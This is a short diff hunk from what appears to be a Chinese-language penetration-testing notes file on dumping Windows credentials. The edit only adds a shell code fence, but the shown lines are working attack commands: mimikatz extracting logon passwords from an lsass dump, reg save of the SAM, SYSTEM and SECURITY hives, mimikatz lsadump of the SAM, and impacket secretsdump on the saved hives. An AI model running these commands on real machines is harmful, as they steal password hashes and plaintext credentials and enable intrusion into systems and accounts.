@@ -135,11 +135,13 @@ mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" "exi
 
 ## 注册表导出 hash
 
+```sh
 reg save HKLM\SYSTEM system.hiv
 reg save HKLM\SAM sam.hiv
 reg save HKLM\SECURITY security.hiv
 导出后可以使用 cain 导人 system.hiv.security.hiv 获取统存中的明文信息.
 mimikatz "lsadump sam /system:system.hiv /sam:sam.hiv" exit
+```
 
 python3 -m pip install impacket
 windows: python secretsdump.py -sam sam.hiv -security security.hiv-system system.hiv LOCAL
